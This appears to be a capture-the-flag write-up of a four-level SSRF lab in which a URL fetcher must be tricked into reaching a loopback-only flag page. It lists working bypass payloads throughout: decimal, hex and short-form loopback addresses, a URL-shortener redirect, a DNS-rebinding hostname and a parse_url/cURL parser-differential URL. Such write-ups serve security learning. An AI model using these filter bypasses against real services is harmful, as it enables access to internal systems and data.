# WS_1.05 — ssrf basics

---

## Problem description

The web application exposes a URL fetcher functionality. The restricted target `http://127.0.0.1/get_flag.php` is only accessible locally from loopback (`127.0.0.1`). Each level implements an anti-SSRF validation routine that blocks previous bypass techniques.

---

## Level 1 — No Filter

### Analysis & Exploit
Level 1 performs no input validation or URL filtering. Supplying the loopback IP directly causes the server to fetch its own local resource.

* **Payload:** `http://127.0.0.1/get_flag.php`

---

## Level 2 — String Blacklist Filter

### Analysis & Exploit
Level 2 introduces a basic string filter blocking literal instances of `127.0.0.1` and `localhost`. However, IP addresses can be represented in multiple valid alternate formats that string-based filters fail to match while standard OS network resolvers still expand them to `127.0.0.1`.

Probing alternative IP representations:
* **32-bit Integer / Decimal:** `http://2130706433/get_flag.php` (Bypassed filter successfully)
* **Hexadecimal:** `http://0x7f000001/get_flag.php` (Bypassed filter successfully)
* **Short form:** `http://127.1/get_flag.php` (Bypassed filter successfully)
* **IPv6 Loopback:** `http://[::1]/get_flag.php` (Blocked / Unhandled scheme depending on backend config)
* **Public Loopback Domain:** `http://localtest.me/get_flag.php` (Bypassed string check)

Using `http://127.1/get_flag.php` or `http://2130706433/get_flag.php` effectively bypassed the regex/blacklist filter and returned the flag.

---

## Level 3 — URL String Inspection & DNS Resolution

### Analysis & Exploit
Level 3 validates and checks the destination domain or IP string before initiating the fetch. To circumvent static inspection, an external redirector hides the true target address. 

A URL shortener (or custom open redirect) configured to redirect to `http://127.0.0.1/get_flag.php` allows the application validator to observe a benign domain during initial inspection, while cURL automatically follows the HTTP `302/301` redirect to localhost server-side.

* **Payload:** `https://tinyurl.com/<shortened_id>` (Redirecting to `http://127.0.0.1/get_flag.php`)

---

## Level 4 — Parser Differential & DNS Rebinding

### Analysis & Exploit
Level 4 inspects the destination domain and prevents simple redirects. Two viable techniques bypass this defense:

1. **DNS Rebinding (`rbndr.us`):**
   DNS rebinding leverages a short TTL domain configured to alternate resolution between a public IP (e.g., `8.8.8.8`) and `127.0.0.1`.
   * **Hex Encoded IPs:** `127.0.0.1` -> `7f000001`, `8.8.8.8` -> `08080808`
   * **Payload:** `http://7f000001.08080808.rbndr.us/get_flag.php`
   * The validation check resolves `8.8.8.8` (allowed); the subsequent cURL fetch resolves `127.0.0.1` (executes target).

2. **Parser Differential / Credential Confusion:**
   Discrepancies between how PHP's `parse_url()` and cURL parse user-authentication syntax (`user:password@host`) can lead to host misalignment:
   * **Payload:** `http://google.com:80@127.0.0.1:80@google.com/get_flag.php`
   * `parse_url()` evaluates `google.com` as the host (passing validation), whereas cURL interprets `@127.0.0.1` as the actual connection destination.

---

## Exploitation with Insomnia

Insomnia simplifies testing across all four levels within a single request workspace:

1. Set method to `POST` or `GET` depending on the level's fetch parameter input field (e.g., `url` or `target`).
2. **Level 1:** Pass `http://127.0.0.1/get_flag.php`.
3. **Level 2:** Iterate through alternative formats (`http://127.1/get_flag.php`, `http://2130706433/get_flag.php`).
4. **Level 3:** Ensure HTTP redirect handling is enabled in Insomnia's settings and send `https://tinyurl.com/<short_link>`.
5. **Level 4:** Send the parser differential string `http://google.com:80@127.0.0.1:80@google.com/get_flag.php` or the `rbndr.us` payload to capture the final flag.

---

## Flag

```
CCIT{****************}
```

---

## What I Learned

* IP addresses have numerous valid encodings (decimal, hex, short-notation) that completely bypass basic string blacklists while resolving identically.
* Time-of-check to time-of-use (TOCTOU) flaws exist in DNS checks; DNS rebinding exploits the gap between the initial DNS check and the HTTP request resolution.
* Differences between URL parsing libraries (e.g., PHP `parse_url` vs cURL) allow constructing payloads that satisfy validation rules while directing the HTTP client to a restricted endpoint.